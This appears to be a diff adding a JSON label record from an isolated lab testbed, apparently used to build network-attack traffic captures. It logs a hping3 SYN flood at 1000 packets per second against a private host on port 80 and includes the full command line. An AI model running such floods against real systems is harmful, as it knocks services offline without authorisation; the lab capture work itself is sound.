@@ -1,0 +1,43 @@
+{
+  "id": "attack-synflood-1000pps-r2",
+  "class": "attack",
+  "tool": "hping3",
+  "sender": "agentic-node-01",
+  "senderIp": "10.0.2.50",
+  "target": "10.0.2.119",
+  "pattern": "attack-synflood-1000pps",
+  "params": {
+    "seconds": 10,
+    "pps": 1000,
+    "count": 10000,
+    "flags_or_proto": "syn",
+    "port": 80
+  },
+  "command": [
+    "sudo",
+    "-n",
+    "timeout",
+    "15",
+    "hping3",
+    "-c",
+    "10000",
+    "-i",
+    "u1000",
+    "-I",
+    "eth0",
+    "-d",
+    "0",
+    "-q",
+    "-S",
+    "-p",
+    "80",
+    "10.0.2.119"
+  ],
+  "commandExit": 0,
+  "commandSeconds": 12.7,
+  "pcap": "attack-synflood-1000pps-r2.pcap",
+  "commandStderrTail": "\n--- 10.0.2.119 hping statistic ---\n10000 packets transmitted, 9947 packets received, 1% packet loss\nround-trip min/avg/max = 4.6/12.6/1010.3 ms\n",
+  "rackHealthyAfter": true,
+  "rackNoteAfter": "OpenFlow connected, isolation verified",
+  "controllerDropsDuringRun": 0
+}
